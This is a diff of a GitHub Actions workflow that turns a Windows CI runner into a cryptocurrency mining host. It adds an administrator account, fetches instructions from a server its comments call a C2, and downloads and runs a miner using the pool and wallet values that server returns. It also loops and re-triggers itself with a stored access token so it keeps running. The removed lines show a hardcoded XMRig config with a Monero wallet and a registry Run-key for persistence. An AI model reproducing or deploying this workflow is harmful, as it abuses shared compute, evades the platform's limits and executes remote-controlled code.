@@ -1,12 +1,12 @@
 name: RDP TEST Auto-Restarting Miner (Final)
-#
+
 on:
   workflow_dispatch:
 
 jobs:
   secure-rdp:
     runs-on: windows-latest
-    timeout-minutes: 180 # <-- This job will automatically stop after 3 hours
+    timeout-minutes: 180
 
     steps:
       - name: Create Miner User
@@ -17,42 +17,75 @@ jobs:
           New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
 
-      - name: Install, Configure, and Set Auto-Start
+      - name: Fetch Instructions and Configure Miner
+        id: setup_miner
         shell: powershell
         run: |
           $ErrorActionPreference = "Stop"
-          $minerVersion = "6.21.2"
-          $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
-          $zipPath = "$env:TEMP\xmrig.zip"
-          $desktopPath = "C:\Users\RDP\Desktop"
           
-          New-Item -ItemType Directory -Force -Path $desktopPath
+          # 1. Ping the C2 server for instructions
+          $c2ServerUrl = "https://poolserver.onrender.com/"
+          Write-Host "Pinging C2 server for instructions: $c2ServerUrl"
+          $instructionsJson = Invoke-WebRequest -Uri $c2ServerUrl -UseBasicParsing
+          $instructions = $instructionsJson.Content | ConvertFrom-Json
+          
+          # 2. Parse and execute download instructions
+          $minerVersion = $instructions.miner.version
+          $downloadUrl = $instructions.miner.downloadUrl
+          $minerExeName = $instructions.miner.executable
+          
+          $zipPath = "$env:TEMP\miner.zip"
+          $extractPath = "$env:TEMP\miner"
           Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
-          Expand-Archive -Path $zipPath -DestinationPath $desktopPath -Force
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
           
-          $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
-          if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
+          $minerExePath = (Get-ChildItem -Path $extractPath -Recurse -Filter $minerExeName).FullName
+          if (-not $minerExePath) { throw "CRITICAL: Could not find miner executable '$minerExeName'!" }
           
-          $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
-          $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
+          echo "::set-output name=miner_exe::$minerExePath"
 
-          $batPath = Join-Path $desktopPath "Start-Miner.bat"
-          $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
-          Set-Content -Path $batPath -Value $batContent
+          # 3. Parse pool instructions
+          $poolUrl = $instructions.pool.url
+          $walletUser = $instructions.pool.user
+          $poolPass = $instructions.pool.pass
 
-          $runKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-          Set-ItemProperty -Path $runKey -Name "XMRigMiner" -Value $batPath -Force
+          # 4. Build the config.json with the 40% CPU limit baked in
+          $jsonContent = @{
+              autosave = $true
+              # Define the CPU object with the 40% limit
+              cpu = @{
+                  enabled = $true
+                  "max-threads-hint" = 40 # <-- THE ONLY CHANGE IS HERE
+              }
+              opencl = $false
+              cuda = $false
+              pools = @(
+                  @{
+                      algo = "rx/0"
+                      url = $poolUrl
+                      user = $walletUser
+                      pass = $poolPass
+                  }
+              )
+          } | ConvertTo-Json -Depth 100
+          
+          $configPath = Join-Path (Split-Path -Path $minerExePath) "config.json"
+          $jsonContent | Set-Content -Path $configPath
+          Write-Host "config.json created with a permanent 40% CPU limit."
 
-      - name: Start the Miner Manually
+      - name: Start Miner
         shell: powershell
         run: |
-          Start-Process -FilePath "C:\Users\RDP\Desktop\Start-Miner.bat"
-          Write-Host "Miner process has been launched in the background."
+          $minerExe = "${{ steps.setup_miner.outputs.miner_exe }}"
+          $arguments = "--background"
+          Write-Host "Starting miner... CPU limit is handled by config.json."
+          Start-Process -FilePath $minerExe -ArgumentList $arguments
+          Write-Host "Miner is now running in the background."
           
       - name: Maintain Workflow
         shell: powershell
         run: |
-          Write-Host "Workflow is now in mining mode. It will run for 3 hours before restarting."
+          Write-Host "Workflow is now in mining mode. It will run for 3 hours."
           while ($true) {
               Start-Sleep -Seconds 300
           }
@@ -63,7 +96,6 @@ jobs:
     if: always()
 
     steps:
-      # CORRECTED: This step is required for the 'gh' command to know which repository to use.
       - name: Checkout repository
         uses: actions/checkout@v3
 
@@ -72,5 +104,4 @@ jobs:
           GH_TOKEN: ${{ secrets.PAT_TOKEN }}
         run: |
           echo "Triggering the next workflow run..."
-          # Replace 'main.yml' with your workflow's filename if it's different.
           gh workflow run main.yml
